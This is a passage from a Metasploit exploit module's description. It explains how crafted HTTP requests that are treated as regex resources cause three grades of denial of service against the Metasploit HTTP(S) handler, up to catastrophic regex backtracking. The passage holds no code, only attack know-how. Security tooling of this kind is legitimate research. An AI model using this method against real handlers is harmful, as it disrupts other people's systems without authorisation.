                      'Description' => %q{
        This module exploits the Metasploit HTTP(S) handler by sending
        a specially crafted HTTP request that gets added as a resource handler.
        Resources (which come from the external connections) are evaluated as RegEx
        in the handler server. Specially crafted input can trigger Gentle, Soft and Hard DoS.

        GENTLE: *Current sessions will continue to work, but not future ones*
        A lack of input sanitation permits an attacker to submit a
        request that will be added to the resources and will be used as regex rule
        it is possible then to make a valid regex rule that captures all the new handler
        requests. The sessions that were established previously will continue to work.

        SOFT: *No past or future sessions will work*
        A lack of input sanitation and lack of exception handling causes
        metasploit to behave abnormally when looking an appropriate resource for the
        request, by submitting an invalid regex as a resource. This means that no request,
        current or future will get served an answer.

        HARD: *ReDOS or Catastrophic Regex Backtracking*
        A lack of input sanitization on paths added as resources allows
        an attacker to execute a catastrophic regex backtracking operation
        causing a Denial of Service by CPU consumption.
